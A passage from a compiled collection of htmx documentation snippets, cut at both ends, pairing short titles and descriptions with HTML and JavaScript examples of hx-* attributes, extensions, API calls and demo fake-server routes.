'htmx:afterOnLoad' event,\n  // and before the 'htmx:xhr:loadend' event\n  console.log('Content inserted successfully!');\n});\n```\n\n----------------------------------------\n\nTITLE: htmx PUT Request Example\nDESCRIPTION: This HTML snippet demonstrates how to use the hx-put attribute to trigger a PUT request to the /account endpoint when the button is clicked. The response HTML will be swapped into the innerHTML of the body element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-put.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-put=\"/account\" hx-target=\"body\">\n  Put Money In Your Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: HTML hx-boost attribute example\nDESCRIPTION: Shows how to use the `hx-boost` attribute to convert anchor tags and forms into AJAX requests. Links will issue an AJAX GET request and swap the response into the body tag.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_34\n\nLANGUAGE: html\nCODE:\n```\n<div hx-boost=\"true\">\n    <a href=\"/blog\">Blog</a>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Finding Multiple Elements with htmx.findAll() (JavaScript)\nDESCRIPTION: This snippet demonstrates how to find all elements that match a selector in the DOM using `htmx.findAll()`. It can take a selector string or a root element and a selector string. The first example retrieves all div elements, and the second retrieves all paragraph elements within a specified div.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n// find all divs\nvar allDivs = htmx.findAll(\"div\")\n\n// find all paragraphs within a given div\nvar allParagraphsInMyDiv = htmx.findAll(htmx.find(\"#my-div\"), \"p\")\n```\n\n----------------------------------------\n\nTITLE: Boosting Forms with hx-boost - HTML\nDESCRIPTION: This snippet showcases how to use the hx-boost attribute to convert a standard HTML form into an AJAX request.  When the form is submitted, an AJAX POST request is sent to the specified URL (/example), and the body's inner content is replaced with the server's response.  Requires htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-boost.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form hx-boost=\"true\" action=\"/example\" method=\"post\">\n    <input name=\"email\" type=\"email\" placeholder=\"Enter email...\">\n    <button>Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Polling with Timing Declaration - HTML\nDESCRIPTION: This example demonstrates polling.  The element will issue a `GET` request to `/latest_updates` every second. The response will be swapped into the innerHTML of the div. The `hx-trigger` attribute uses the `every 1s` syntax.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/latest_updates\" hx-trigger=\"every 1s\">\n  Nothing Yet!\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Search Input and Results Table with HTMX\nDESCRIPTION: This HTML snippet creates a search input field and a table to display search results. It utilizes HTMX attributes to handle user input and update the table with the results from the `/search` endpoint. The input field includes triggers for input changes with a delay, 'Enter' key press, and page load. An indicator is displayed during the search process.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<h3>\n  Search Contacts\n  <span class=\"htmx-indicator\">\n    <img src=\"/img/bars.svg\"/> Searching...\n   </span>\n</h3>\n<input class=\"form-control\" type=\"search\"\n       name=\"search\" placeholder=\"Begin Typing To Search Users...\"\n       hx-post=\"/search\"\n       hx-trigger=\"input changed delay:500ms, keyup[key=='Enter'], load\"\n       hx-target=\"#search-results\"\n       hx-indicator=\".htmx-indicator\">\n\n<table class=\"table\">\n    <thead>\n    <tr>\n      <th>First Name</th>\n      <th>Last Name</th>\n      <th>Email</th>\n    </tr>\n    </thead>\n    <tbody id=\"search-results\">\n    </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Triggering Events with hx-trigger and HX-Trigger header - htmx\nDESCRIPTION: This HTML snippet demonstrates event triggering. The `tbody` element has `hx-get` pointing to `/contacts/table` and `hx-trigger` listening for the `newContact` event from the body.  The server response to `/contacts` includes an `HX-Trigger` header that triggers the `newContact` event.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<h2>Contacts</h2>\n<table class=\"table\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody id=\"contacts-table\" hx-get=\"/contacts/table\" hx-trigger=\"newContact from:body\">\n    ...\n  </tbody>\n</table>\n<h2>Add A Contact</h2>\n<form hx-post=\"/contacts\">\n  <label>\n    Name\n        <input name=\"name\" type=\"text\">  \n  </label>\n  <label>\n    Email\n        <input name=\"email\" type=\"email\">  \n  </label>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Enabling Multiple htmx Extensions on Body\nDESCRIPTION: Shows how to enable multiple htmx extensions (preload and morph) for the entire document by placing the `hx-ext` attribute on the body tag. All htmx requests within the body will now utilize both the `preload` and `morph` extensions.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-ext.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"preload,morph\">\n  \"preload\" and \"morph\" extensions are used in this part of the tree...\n</body>\n```\n\n----------------------------------------\n\nTITLE: HTMX Button to Trigger Bootstrap Modal\nDESCRIPTION: This HTML snippet creates a button that triggers a Bootstrap modal dialog using HTMX. When clicked, it sends a GET request to `/modal`, and the response is loaded into the `#modals-here` div. The `data-bs-toggle` and `data-bs-target` attributes are used to initialize the Bootstrap modal.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-bootstrap.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button\n    hx-get=\"/modal\"\n    hx-target=\"#modals-here\"\n    hx-trigger=\"click\"\n    data-bs-toggle=\"modal\"\n    data-bs-target=\"#modals-here\"\n    class=\"btn primary\">Open Modal</button>\n\n<div id=\"modals-here\"\n    class=\"modal modal-blur fade\"\n    style=\"display: none\"\n    aria-hidden=\"false\"\n    tabindex=\"-1\">\n    <div class=\"modal-dialog modal-lg modal-dialog-centered\" role=\"document\">\n        <div class=\"modal-content\"></div>\n    </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: htmx POST Request with hx-post\nDESCRIPTION: This HTML snippet demonstrates the use of the hx-post attribute in htmx.  When the button is clicked, it sends a POST request to the /account/enable endpoint.  The HTML returned from the server replaces the innerHTML of the element specified by hx-target, in this case the <body> tag.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-post.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-post=\"/account/enable\" hx-target=\"body\">\n  Enable Your Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Adding Dynamic Parameters with hx-vars in htmx\nDESCRIPTION: This HTML snippet demonstrates how to use the hx-vars attribute to add a dynamic parameter to an AJAX request. The value of the parameter is determined by the JavaScript function computeMyVar(). Be aware of XSS vulnerabilities when using dynamically computed values.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-vars.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/example\" hx-vars=\"myVar:computeMyVar()\">Get Some HTML, Including A Dynamic Value in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: Enabling hx-target Attribute Inheritance with hx-inherit in HTML\nDESCRIPTION: This code snippet demonstrates how to use the hx-inherit attribute to explicitly enable inheritance of the hx-target attribute from a parent div to its child anchor tags. The hx-target attribute specifies the target element for htmx requests, and hx-inherit ensures that this target is inherited by the anchor tags, even if default inheritance is disabled.  The `hx-boost` attribute enables boost for the anchor tags.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-inherit.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-target=\"#tab-container\" hx-inherit=\"hx-target\">\n  <a hx-boost=\"true\" href=\"/tab1\">Tab 1</a>\n  <a hx-boost=\"true\" href=\"/tab2\">Tab 2</a>\n  <a hx-boost=\"true\" href=\"/tab3\">Tab 3</a>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Using hx-select-oob for Out-of-Band Swap\nDESCRIPTION: This HTML snippet demonstrates the usage of `hx-select-oob` attribute to select an element with the id `alert` from the server response and swap it with the element with the same ID in the DOM. It is used in conjunction with `hx-get`, `hx-select`, and `hx-swap` attributes to fetch data and swap content. The `hx-select` picks out the element with the id `info-details` to replace the button element. The default swap strategy for `hx-select-oob` is `outerHTML`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-select-oob.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div>\n   <div id=\"alert\"></div>\n    <button hx-get=\"/info\" \n            hx-select=\"#info-details\" \n            hx-swap=\"outerHTML\"\n            hx-select-oob=\"#alert\">\n        Get Info!\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Rendering Search Results UI in Javascript\nDESCRIPTION: This JavaScript function `resultsUI` generates the HTML markup to display the search results in a table format.  It iterates through the array of `contacts`, extracting the first name, last name, and email, and then dynamically creates the table rows.  It is intended to update the `#search-results` element in the HTML.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    function resultsUI(contacts){\n        var txt = \"\";\n        for (var i = 0; i < contacts.length; i++) {\n          var c = contacts[i];\n          txt += \"<tr><td>\" + c.FirstName + \"</td><td>\" + c.LastName + \"</td><td>\" + c.Email + \"</td></tr>\\n\";\n        }\n        return txt;  \n    }\n```\n\n----------------------------------------\n\nTITLE: CSS Transition - Fade In On Addition with htmx\nDESCRIPTION: This snippet demonstrates how to fade in new content using CSS transitions and htmx. The `htmx-added` class is used to initially set the opacity to 0, and then a CSS transition is applied to fade the content in when the class is removed.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<style>\n#fade-me-in.htmx-added {\n  opacity: 0;\n}\n#fade-me-in {\n  opacity: 1;\n  transition: opacity 1s ease-out;\n}\n</style>\n<button id=\"fade-me-in\"\n        class=\"btn primary\"\n        hx-post=\"/fade_in_demo\"\n        hx-swap=\"outerHTML settle:1s\">\n        Fade Me In\n</button>\n```\n\n----------------------------------------\n\nTITLE: HTML Table Structure with HTMX attributes\nDESCRIPTION: This HTML snippet defines the structure of a table with HTMX attributes for confirming deletion, targeting the closest table row, and swapping the outer HTML after a delay. It sets up the confirmation dialog and the swap behavior for deleting rows.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/delete-row.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<table class=\"table delete-row-example\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th>Status</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody hx-confirm=\"Are you sure?\" hx-target=\"closest tr\" hx-swap=\"outerHTML swap:1s\">\n    ...\n  </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Running Progress Bar - HTML\nDESCRIPTION: This HTML snippet defines the structure for the progress bar during the running state. It uses `hx-get` to periodically fetch progress updates from the `/job/progress` endpoint every 600ms. The `hx-swap` attribute updates the inner HTML of the progress bar with the new progress value. The `hx-trigger=\"done\" hx-get=\"/job\"` part handles the transition to the 'complete' state when the server sends the `HX-Trigger: done` header.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/progress-bar.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div hx-trigger=\"done\" hx-get=\"/job\" hx-swap=\"outerHTML\" hx-target=\"this\">\n  <h3 role=\"status\" id=\"pblabel\" tabindex=\"-1\" autofocus>Running</h3>\n\n  <div\n    hx-get=\"/job/progress\"\n    hx-trigger=\"every 600ms\"\n    hx-target=\"this\"\n    hx-swap=\"innerHTML\">\n    <div class=\"progress\" role=\"progressbar\" aria-valuemin=\"0\" aria-valuemax=\"100\" aria-valuenow=\"0\" aria-labelledby=\"pblabel\">\n      <div id=\"pb\" class=\"progress-bar\" style=\"width:0%\">\n    </div>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Modify htmx Configuration - htmx.config - JavaScript\nDESCRIPTION: This code snippet shows how to modify the htmx runtime configuration using the `htmx.config` property. It demonstrates updating the history cache size.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// update the history cache size to 30\nhtmx.config.historyCacheSize = 30;\n```\n\n----------------------------------------\n\nTITLE: hx-push-url Example: Pushing a Specific URL\nDESCRIPTION: This example shows how to use `hx-push-url` with a specific URL to push a different URL than the fetched URL into the browser's location history. When the div is triggered, htmx will make a GET request to `/account`, but will push `/account/home` into the browser history.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-push-url.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/account\" hx-push-url=\"/account/home\">\n  Go to My Account\n</div>\n```\n\n----------------------------------------\n\nTITLE: Targeting a div with hx-target in htmx (HTML)\nDESCRIPTION: This HTML snippet demonstrates how to use the hx-target attribute to specify a div element with the ID 'response-div' as the target for swapping content. The hx-post attribute sends a POST request to the '/register' URL, and the response is appended to the target div using hx-swap=\"beforeend\".\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-target.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <div id=\"response-div\"></div>\n    <button hx-post=\"/register\" hx-target=\"#response-div\" hx-swap=\"beforeend\">\n        Register!\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with list HTML\nDESCRIPTION: This example shows how to use `hx-swap-oob` to insert a list item (`<li>`) into a list (`<ul>`). The `<li>` is encapsulated within a `<ul>` tag that specifies the target element with `beforeend:#list1`. The encapsulating `<ul>` tag will be stripped during the swap.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<ul hx-swap-oob=\"beforeend:#list1\">\n\t<li>...</li>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Logic (JavaScript)\nDESCRIPTION: This JavaScript code simulates the server-side logic for handling contact information. It defines routes for displaying and editing the contact, and it uses templates to generate the HTML. It includes functions to initialize routes, handle GET and PUT requests, and render the form and display templates.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-edit.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n//=========================================================================\n// Fake Server Side Code\n//=========================================================================\n\n// data\nvar contact = {\n    \"firstName\" : \"Joe\",\n    \"lastName\" : \"Blow\",\n    \"email\" : \"joe@blow.com\"\n};\n\n// routes\ninit(\"/contact/1\", function(request){\n    return displayTemplate(contact);\n});\n\nonGet(\"/contact/1/edit\", function(request){\n    return formTemplate(contact);\n});\n\nonPut(\"/contact/1\", function (req, params) {\n    contact.firstName = params['firstName'];\n    contact.lastName = params['lastName'];\n    contact.email = params['email'];\n    return displayTemplate(contact);\n});\n\n// templates\nfunction formTemplate(contact) {\nreturn `<form hx-put=\"/contact/1\" hx-target=\"this\" hx-swap=\"outerHTML\">\n  <div>\n    <label for=\"firstName\">First Name</label>\n    <input autofocus type=\"text\" id=\"firstName\" name=\"firstName\" value=\"${contact.firstName}\">\n  </div>\n  <div class=\"form-group\">\n    <label for=\"lastName\">Last Name</label>\n    <input type=\"text\" id=\"lastName\" name=\"lastName\" value=\"${contact.lastName}\">\n  </div>\n  <div class=\"form-group\">\n    <label for=\"email\">Email Address</label>\n    <input type=\"email\" id=\"email\" name=\"email\" value=\"${contact.email}\">\n  </div>\n  <button class=\"btn primary\" type=\"submit\">Submit</button>\n  <button class=\"btn danger\" hx-get=\"/contact/1\">Cancel</button>\n</form>`\n    }\n\n    function displayTemplate(contact) {\n        return `<div hx-target=\"this\" hx-swap=\"outerHTML\">\n    <div><label>First Name</label>: ${contact.firstName}</div>\n    <div><label>Last Name</label>: ${contact.lastName}</div>\n    <div><label>Email Address</label>: ${contact.email}</div>\n    <button hx-get=\"/contact/1/edit\" class=\"btn primary\">\n    Click To Edit\n    </button>\n</div>`;\n    }\n```\n\n----------------------------------------\n\nTITLE: htmx Request Indicator\nDESCRIPTION: This HTML snippet shows how to use the `htmx-indicator` class to display a spinner during an AJAX request. The `htmx-request` class is added to the button during the request, revealing the image with the `htmx-indicator` class.  It requires a spinner image file at `/spinner.gif`\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_16\n\nLANGUAGE: html\nCODE:\n```\n<button hx-get=\"/click\">\n    Click Me!\n    <img class=\"htmx-indicator\" src=\"/spinner.gif\">\n</button>\n```\n\n----------------------------------------\n\nTITLE: Installing Idiomorph via CDN - HTML\nDESCRIPTION: This snippet demonstrates how to install the Idiomorph extension for htmx by including the necessary JavaScript files from a CDN.  It's crucial to load the core htmx library before the extension and enable the extension using `hx-ext=\"morph\"` on the `<body>` tag. The snippet includes integrity attributes for security verification.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/idiomorph.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/idiomorph@0.7.3\" integrity=\"sha384-JcorokHTL/m+D6ZHe2+yFVQopVwZ+91GxAPDyEZ6/A/OEPGEx1+MeNSe2OGvoRS9\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/idiomorph@0.7.3/dist/idiomorph-ext.min.js\" integrity=\"sha384-szktAZju9fwY15dZ6D2FKFN4eZoltuXiHStNDJWK9+FARrxJtquql828JzikODob\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"morph\">\n```\n\n----------------------------------------\n\nTITLE: Including CSRF Token in Body element via hx-headers\nDESCRIPTION: This HTML snippet shows an alternative placement for the `hx-headers` attribute, within the `<body>` tag. This will include the CSRF token in the HTTP request header for all requests originating from the body. The placeholder `CSRF_TOKEN_INSERTED_HERE` is intended to be replaced by an actual CSRF token value.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_59\n\nLANGUAGE: HTML\nCODE:\n```\n    <body hx-headers='{\"X-CSRF-TOKEN\": \"CSRF_TOKEN_INSERTED_HERE\"}'>\n        :\n    </body>\n```\n\n----------------------------------------\n\nTITLE: Confirming Requests with hx-confirm - HTML\nDESCRIPTION: This snippet demonstrates how to use the `hx-confirm` attribute to display a confirmation dialog before issuing a request.  If the user cancels the dialog, the request will not be sent.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_29\n\nLANGUAGE: html\nCODE:\n```\n<button hx-delete=\"/account\" hx-confirm=\"Are you sure you wish to delete your account?\">\n    Delete My Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Including an Input Value with hx-include in htmx\nDESCRIPTION: This example demonstrates how to use the `hx-include` attribute to include the value of an input element with the name 'email' when a button is clicked.  The `hx-post` attribute sends a POST request to the '/register' endpoint. The input element is outside of the button.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-include.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <button hx-post=\"/register\" hx-include=\"[name='email']\">\n        Register!\n    </button>\n    Enter email: <input name=\"email\" type=\"email\"/>\n</div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with tbody HTML\nDESCRIPTION: This example shows how to use `hx-swap-oob` to insert a table row (`<tr>`) into a table with a `<tbody>` element.  The `<tr>` is encapsulated within a `<tbody>` tag that specifies the target element with `beforeend:#table tbody`. The encapsulating `<tbody>` tag will be stripped during the swap.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<tbody hx-swap-oob=\"beforeend:#table tbody\">\n\t<tr>\n\t\t...\n\t</tr>\n</tbody>\n```\n\n----------------------------------------\n\nTITLE: Listening to SSE extension events - Javascript\nDESCRIPTION: This snippet demonstrates how to listen for events dispatched by the htmx SSE extension. Each event object has a `detail` field that contains details of the event.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:sseBeforeMessage', function (e) {\n    // do something before the event data is swapped in\n})\n```\n\n----------------------------------------\n\nTITLE: HTMX Click to Load Button\nDESCRIPTION: This HTML snippet creates a button that, when clicked, fetches the next page of data using HTMX and replaces the current row with the new data. The `hx-get` attribute specifies the URL to fetch, `hx-target` specifies the element to replace, and `hx-swap` specifies the swap strategy.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-load.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<tr id=\"replaceMe\">\n  <td colspan=\"3\">\n    <button class='btn primary' hx-get=\"/contacts/?page=2\"\n                        hx-target=\"#replaceMe\"\n                        hx-swap=\"outerHTML\">\n         Load More Agents... <img class=\"htmx-indicator\" src=\"/img/bars.svg\">\n    </button>\n  </td>\n</tr>\n```\n\n----------------------------------------\n\nTITLE: Removing an Element from the DOM with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to remove an element from the DOM using the `htmx.remove()` method.  It can take just the element, or the element and a delay in milliseconds before removal. The examples show removing a div element immediately and after a 2-second delay.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\n// removes my-div from the DOM\nhtmx.remove(htmx.find(\"#my-div\"));\n\n// removes my-div from the DOM after a delay of 2 seconds\nhtmx.remove(htmx.find(\"#my-div\"), 2000);\n```\n\n----------------------------------------\n\nTITLE: HTML Form for Bulk Update with HTMX\nDESCRIPTION: This HTML snippet defines a form that wraps a table. Each row contains a checkbox. When the form is submitted, HTMX sends a POST request to `/users`. The response updates the element with the ID `toast` with an animation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/bulk-update.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<form id=\"checked-contacts\"\n      hx-post=\"/users\"\n      hx-swap=\"innerHTML settle:3s\"\n      hx-target=\"#toast\">\n    <table>\n      <thead>\n      <tr>\n        <th>Name</th>\n        <th>Email</th>\n        <th>Active</th>\n      </tr>\n      </thead>\n      <tbody id=\"tbody\">\n        <tr>\n          <td>Joe Smith</td>\n          <td>joe@smith.org</td>\n          <td><input type=\"checkbox\" name=\"active:joe@smith.org\"></td>\n        </tr>\n        ...\n      </tbody>\n    </table>\n    <input type=\"submit\" value=\"Bulk Update\" class=\"btn primary\">\n    <output id=\"toast\"></output>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Adding Authorization Header to htmx Requests (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to add an authorization header to all htmx requests. It uses an event listener for the 'htmx:configRequest' event. The event listener modifies the headers of the request to include the authorization token. The token variable is assumed to be defined elsewhere in the scope.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-hotwire-turbo.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:configRequest', (event) => {\n    event.detail.headers['Authorization'] = `Bearer ${token}`\n})\n```\n\n----------------------------------------\n\nTITLE: Initializing Route and Handling Search Request in Javascript\nDESCRIPTION: This JavaScript snippet defines route initialization and request handling for the `/search` endpoint.  The `init` function is used to render the search UI. The `onPost` function handles the search request, retrieves contacts matching the search term from a data store, and then updates the results UI with the contacts.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n    // routes\n    init(\"/init\", function(request, params){\n      return searchUI();\n    });\n    \n    onPost(/\\/search.*/, function(request, params){\n        var search = params['search'];\n        var contacts = dataStore.findContactsMatching(search);\n        return resultsUI(contacts);\n      });\n```\n\n----------------------------------------\n\nTITLE: Adding Confirmation Dialog with hx-confirm - HTML\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-confirm` attribute to add a confirmation dialog before a DELETE request. The `hx-delete` attribute specifies the endpoint, and `hx-confirm` sets the confirmation message. When the button is clicked, a confirmation dialog will appear, and the DELETE request will only be sent if the user confirms.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-confirm.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button hx-delete=\"/account\" hx-confirm=\"Are you sure you wish to delete your account?\">\n  Delete My Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx WebSockets extension via CDN\nDESCRIPTION: This snippet demonstrates how to install the `htmx-ext-ws` extension using a CDN. It includes both the core htmx library and the WebSockets extension. The `hx-ext=\"ws\"` attribute enables the extension on the body element. Always include the core htmx library before the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-ws@2.0.2\" integrity=\"sha384-vuKxTKv5TX/b3lLzDKP2U363sOAoRo5wSvzzc3LJsbaQRSBSS+3rKKHcOx5J8doU\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"ws\">\n```\n\n----------------------------------------\n\nTITLE: Defining a New htmx Extension (JavaScript)\nDESCRIPTION: This snippet shows how to define a new htmx extension using the `htmx.defineExtension()` method. It defines an extension named \"silly\" that logs the name of all events triggered. The extension object defines event handlers that are invoked during htmx's processing.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n// defines a silly extension that just logs the name of all events triggered\nhtmx.defineExtension(\"silly\", {\n  onEvent : function(name, evt) {\n    console.log(\"Event \" + name + \" was triggered!\")\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: HTMX Button with Keyboard Shortcut\nDESCRIPTION: This HTML snippet creates a button that triggers an HTTP POST request to \"/doit\" when clicked or when the alt-shift-D keyboard shortcut is pressed. It uses the hx-trigger attribute with click and keyup events, combined with the from: modifier to listen for the keyup event on the body element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/keyboard-shortcuts.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button class=\"btn primary\" hx-trigger=\"click, keyup[altKey&&shiftKey&&key=='D'] from:body\"\n        hx-post=\"/doit\">Do It! (alt-shift-D)</button>\n```\n\n----------------------------------------\n\nTITLE: Initial Contact Table and Form HTML - htmx\nDESCRIPTION: This HTML snippet presents the initial structure of a contact table and a form to add new contacts. The form utilizes the hx-post attribute to submit data to the /contacts endpoint. The goal is to update the contacts table with the newly added contact upon successful form submission.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<h2>Contacts</h2>\n<table class=\"table\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody id=\"contacts-table\">\n    ...\n  </tbody>\n</table>\n<h2>Add A Contact</h2>\n<form hx-post=\"/contacts\">\n  <label>\n    Name\n        <input name=\"name\" type=\"text\">  \n  </label>\n  <label>\n    Email\n        <input name=\"email\" type=\"email\">  \n  </label>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Basic hx-swap-oob Example HTML\nDESCRIPTION: This example demonstrates a basic use case of `hx-swap-oob`. The first `div` will be swapped into the target element. The second `div` with `hx-swap-oob=\"true\"` will replace the element with the id `alerts` in the DOM.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div>\n ...\n</div>\n<div id=\"alerts\" hx-swap-oob=\"true\">\n    Saved!\n</div>\n```\n\n----------------------------------------\n\nTITLE: Handling Click Events with hx-on:click in HTML\nDESCRIPTION: Demonstrates how to use the `hx-on:click` attribute to execute JavaScript when a click event occurs on an HTML element.  The `hx-on:click` attribute allows direct embedding of JavaScript for specific event handling. It triggers an alert dialog when the div is clicked.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-on:click=\"alert('Clicked!')\">Click</div>\n```\n\n----------------------------------------\n\nTITLE: Removing an htmx Extension (JavaScript)\nDESCRIPTION: This snippet demonstrates how to remove a previously defined htmx extension using the `htmx.removeExtension()` method. The method takes the name of the extension to remove as a parameter.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.removeExtension(\"my-extension\");\n```\n\n----------------------------------------\n\nTITLE: htmx Trigger Filter Example\nDESCRIPTION: This example demonstrates how to use a trigger filter to conditionally trigger an AJAX request.  The `hx-trigger` attribute has a filter `click[ctrlKey]`, meaning the GET request to `/clicked` is only triggered on a control-click.\nSOURCE: 